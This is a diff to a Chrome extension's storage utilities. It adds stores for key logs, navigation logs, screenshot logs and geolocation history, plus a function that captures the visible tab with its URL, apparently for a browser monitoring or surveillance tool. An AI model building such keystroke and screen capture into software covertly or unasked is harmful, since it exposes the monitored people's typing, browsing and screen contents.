@@ -1,5 +1,12 @@
+import { v4 as uuidv4 } from "uuid";
 import { StorageKey } from "../consts";
-import { IGeolocationEntry, ILogEntry } from "../interfaces";
+import {
+  IActivityLogEntry,
+  IGeolocationEntry,
+  IKeyLogEntry,
+  INavigationLogEntry,
+  IScreenshotLogEntry,
+} from "../interfaces";
 
 export async function simpleHas(key: StorageKey) {
   return (await simpleGet<any>(key)) !== undefined;
@@ -19,34 +26,44 @@ export async function simpleSet<T>(key: StorageKey, value: T) {
   });
 }
 
-export async function simplePrepend<T>(key: StorageKey, value: T) {
+export async function simplePrepend<T>(
+  key: StorageKey,
+  value: T,
+  maxLength: number = 500
+) {
   const current: T[] = await simpleGet<T[]>(key, []);
-  await simpleSet<T[]>(key, [value, ...current]);
+  await simpleSet<T[]>(key, [value, ...current].slice(0, maxLength));
 }
 
-export async function simpleAppend<T>(key: StorageKey, value: T) {
+export async function simpleAppend<T>(
+  key: StorageKey,
+  value: T,
+  maxLength: number = 500
+) {
   const current: T[] = await simpleGet<T[]>(key, []);
-  await simpleSet<T[]>(key, [...current, value]);
+  await simpleSet<T[]>(key, [...current, value].slice(-maxLength));
 }
 
 export async function writeLog(message: string) {
-  const newLog: ILogEntry = {
-    timestamp: new Date().toISOString(),
+  const newLog: IActivityLogEntry = {
     message,
+    ...logData(),
   };
 
-  await simplePrepend<ILogEntry>(StorageKey.LOG, newLog);
+  await simplePrepend<IActivityLogEntry>(StorageKey.LOG, newLog);
 }
 
 export async function clear() {
   simpleSet<IGeolocationEntry[]>(StorageKey.GEOLOCATION_HISTORY, []);
-  simpleSet<ILogEntry[]>(StorageKey.LOG, []);
+  simpleSet<IActivityLogEntry[]>(StorageKey.LOG, []);
+  simpleSet<IKeyLogEntry[]>(StorageKey.KEY_LOG, []);
+  simpleSet<INavigationLogEntry[]>(StorageKey.NAVIGATION_LOG, []);
+  simpleSet<IScreenshotLogEntry[]>(StorageKey.SCREENSHOT_LOG, []);
 }
 
 export async function watch<T>(
   key: StorageKey,
-  callback: (storageChange: chrome.storage.StorageChange) => void,
-  options: { initialCheck?: boolean } = {}
+  callback: (storageChange: chrome.storage.StorageChange) => void
 ) {
   chrome.storage.onChanged.addListener((changes) => {
     for (let [k, v] of Object.entries(changes)) {
@@ -56,7 +73,29 @@ export async function watch<T>(
     }
   });
 
-  if (options.initialCheck) {
-    callback({ newValue: await simpleGet<T>(key) });
-  }
+  callback({ newValue: await simpleGet<T>(key) });
+}
+
+export function logData() {
+  return {
+    uuid: uuidv4() as string,
+    timestamp: new Date().toISOString(),
+  };
+}
+
+export async function captureVisibleTab() {
+  const [activeTab] = await chrome.tabs.query({
+    active: true,
+    currentWindow: true,
+  });
+
+  await simplePrepend<IScreenshotLogEntry>(
+    StorageKey.SCREENSHOT_LOG,
+    {
+      ...logData(),
+      url: activeTab.url as string,
+      imageData: await chrome.tabs.captureVisibleTab(),
+    },
+    20
+  );
 }
